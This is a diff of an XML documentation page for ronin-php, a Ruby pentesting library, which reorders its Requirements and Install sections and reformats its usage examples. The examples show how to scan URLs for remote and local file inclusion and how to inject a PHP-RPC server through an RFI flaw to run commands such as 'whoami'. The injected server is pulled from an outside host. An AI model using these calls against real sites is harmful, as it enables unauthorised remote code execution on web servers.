@@ -56,26 +56,6 @@
         </list>
       </section>
 
-      <section label="requirements" title="Requirements">
-        <list>
-          <item>
-            <a href="/index.html">Ronin</a> &gt;= 0.0.9
-          </item>
-
-          <item>
-            <a href="http://rubyforge.org/frs/?group_id=5440&amp;release_id=25118">cssmin</a>
-          </item>
-
-          <item>
-            <a href="http://rubyforge.org/frs/?group_id=5440&amp;release_id=20432">jsmin</a>
-          </item>
-        </list>
-      </section>
-
-      <section label="install" title="Install">
-        <shell>$ sudo gem install ronin-php</shell>
-      </section>
-
       <section label="synopsis" title="Synopsis">
         <list>
           <item>
@@ -89,6 +69,7 @@
         <list>
           <item>
             Test for Remote File Inclusion (RFI):
+
             <code>require 'ronin/php/rfi'
 
 url = URI('http://www.example.com/page.php?lang=en')
@@ -98,18 +79,21 @@ url.has_rfi?
 
           <item>
             Get the first viable RFI vulnerability:
+
             <code>url.first_rfi
 # =&gt; #&lt;Ronin::PHP::RFI: ...&gt;</code>
           </item>
 
           <item>
             Scan a URL for RFI vulnerabilities:
+
             <code>url.rfi_scan
 # =&gt; [#&lt;Ronin::PHP::RFI: ...&gt;, ...]</code>
           </item>
 
           <item>
             Inject a PHP-RPC Server into a RFI vulnerable URL:
+
             <code>require 'ronin/rpc/php'
 
 client = url.rfi.rpc
@@ -119,12 +103,14 @@ client.exec('whoami')
 
           <item>
             Get a direct URL to the AJAX interface of the PHP-RPC Server:
+
             <code>client.url
 # => "http://www.example.com/page.php?en=http://ronin.rubyforge.org/static/ronin/php/rpc/server.min.php?"</code>
           </item>
 
           <item>
             Test for Local File Inclusion (LFI):
+
             <code>require 'ronin/php/lfi'
 
 url = URI('http://www.example.com/site.php?page=home')
@@ -134,16 +120,34 @@ url.has_lfi?
 
           <item>
             Get the first viable LFI vulnerability:
+
             <code>url.first_lfi
 # =&gt; #&lt;Ronin::PHP::LFI: ...&gt;</code>
           </item>
 
           <item>
             Scan a URL for LFI vulnerabilities:
+
             <code>url.lfi_scan
 # =&gt; [#&lt;Ronin::PHP::LFI: ...&gt;, ...]</code>
           </item>
         </list>
+      </section>
+
+      <section label="requirements" title="Requirements">
+        <list>
+          <item>
+            <a href="/index.html">Ronin</a> &gt;= 0.3.0
+          </item>
+
+          <item>
+            <a href="/web/">Ronin Web</a> &gt;= 0.2.0
+          </item>
+        </list>
+      </section>
+
+      <section label="install" title="Install">
+        <shell>$ sudo gem install ronin-php</shell>
       </section>
 
       <section label="development" title="Development">
